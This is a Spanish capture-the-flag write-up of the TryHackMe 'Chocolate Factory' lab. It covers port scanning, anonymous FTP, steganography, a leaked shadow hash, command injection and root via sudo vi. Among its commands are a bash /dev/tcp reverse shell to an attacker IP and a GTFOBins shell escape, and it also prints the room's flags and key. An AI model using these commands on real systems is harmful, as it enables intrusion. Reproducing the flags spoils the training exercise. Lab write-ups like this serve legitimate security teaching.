# Chocolate Factory - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)
- IP de la máquina: 10.10.245.251

## Enumeración de puertos con Nmap

### Comando utilizado

````
$ nmap --open -sS -sV -T4 -n -Pn 10.10.245.251 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 04:47 EDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 18.18% done; ETC: 04:48 (0:00:27 remaining)
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 27.27% done; ETC: 04:49 (0:01:44 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 27.27% done; ETC: 04:50 (0:01:49 remaining)
Stats: 0:02:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.80% done; ETC: 04:50 (0:00:00 remaining)
Nmap scan report for 10.10.245.251
Host is up (0.071s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?

`````
## Acceso al FTP - Anonymous

````
ftp 10.10.245.251
Connected to 10.10.245.251.
220 (vsFTPd 3.0.3)
Name (10.10.245.251:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20533|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||51413|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
````
nos pasamos la imagen con get y buscaremos metadatos o arvhivos ocultos, después de usar herraminetas sin exito la unica que me ha funcionado:
````
 steghide extract -sf gum_room.jpg 
Enter passphrase: 
wrote extracted data to "b64.txt".
````
El archivo esta codificado parece base64 o similar, voy a probar en ciberchef  a ver si me encuentra algo y efectivamente:

````

daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
````
tenemos un /etc/shadow

## Enumeración http - Gobuster

Vamos a lanzar un gobuster
````
 gobuster dir -u http://10.10.245.251 -w subdomains-top1million-110000.txt -x php,js,html.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.245.251
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                subdomains-top1million-110000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html.txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
Progress: 401981 / 457772 (87.81%)^C
````
Vamos a entrar a home.php
Y vemos que podemos ejecutar comandos, vamos a lanzar una shell yo he usado esto:
```` bash
bash -c 'bash -i >& /dev/tcp/10.9.3.53/4444 0>&1'
````
y nos ponemos en escucha con:
````
nc -lvnp 4444
````
y tenemos accesos, después abriendo archivos dentro de teleport hay un id_rsa qye pasandole a un ssh2john desde mi localhost no tenia password, entonces he entrado por ssh desde el user charlie.

````
sudo ssh -i id_rsa charlie@10.10.245.251
````
````
charlie@chocolate-factory:/home$ whoami
charlie
````
dentro de este esta la flag:
````
flag{cd5509042371b34e4826e4838b522d2e}
````
## Escalada a root 

Realizamos un sudo -l a ver si tenemos permisos y si, hay un binario que podemos usar con permisos de sudo:
````
charlie@chocolate-factory:/home$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
````
Tenemos el binario vi, vamos a buscar en gtobins y ya estaría
````
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
                                                                                                                                                                                                                                            
# whoami                                                                                                                                                                                                                                    
root
````
## Task

1. Challenges 

````
# cd /
# ls
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var  vmlinuz  vmlinuz.old
# cd var
# ls
backups  cache  crash  ftp  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
# cd www
# ls
html
# cd html
# ls
home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
# nano index.php.bak
# nano key_rev_key
?ELF^B^A^A^@^@^@^@^@^@^@^@^@^C^@>^@^A^@^@^@�^F^@^@^@^@^@^@@^@^@^@^@^@^@^@�^Y^@^@^@^@^@^@^@^@^@^@@^@8^@ ^@@^@^]^@^\^@^F@^@^@^@^@^@^@^@^@�^O ^@^@^@^@^@^G^@^@^@^D^@^@^@^@^@^@^@^@^@^@^@�^O ^@^@^@^@^@^G^@^@^@^F^@^@^@^@^@^@^@^@^@^@^@�^O ^@^@^@^@^@^G^@^@^@^H^@^@^$
 congratulations you have found the key:   ^@^@^@^@b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='^
 Keep its safe^@Bad name!^@^@^@^A^[^C;8^@^@^@^F^@^@^@�AzR^@^Ax^P^A^[^L^G^H�^A^G^P^T^@^@^@^\^@^@^@����+^@^@^@^@^@^@^Ax^P$
^@^@^@^@^@^@^@�^@^@^@^@^@^@^@^K^@^@^@^@^@^@^@^X^@^@^@^@^@^@^@^U^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^@^@^@^@^@^@�^O ^@^@^@^@^@^B^@^@^@^@^@^@^@x^@^@^@^@^@^@^@^T^@^@^@^@^@^@^@^G^@^@^@^@^@^@^@^W^@^@^@^@^@^@^@�^E^@^@^@^@^@^@^G^@^@^@^@^@^@^@�^$
^@�^E^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^K^@^X^F^@^@^@^@^@^@^@^@^@^@^@^@^@^@^^@^@^@^@^@^@^@^@^@^@^@^@^C^@^N^@�^F^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^$
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^D^@��^@^@^^@�^@^@^@^A^@^U^@�^M ^@^@^@^@^@^@^@^@^@^@^@^@^@�^@^@^@^@^@^S^@�^M ^@^@^@^@^@^@^@^@^@^@^@^@^@�^@^@^@^@^@^Q^@�       ^@^$
````
Y ahí tenemos la posible clave 
````
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
````
2. What is Charlie's password?
antes en el home.php me he descargado los archivos que había con python abriendo un servidor y he descubierto que en validate.php:
`````php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>
`````
````
cn7824
````
4. change user to charlie
````
# cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
````
5. Enter the root flag
````
python root.py
Enter the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
flag{cec59161d338fef787fcb4e296b42124}
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
````
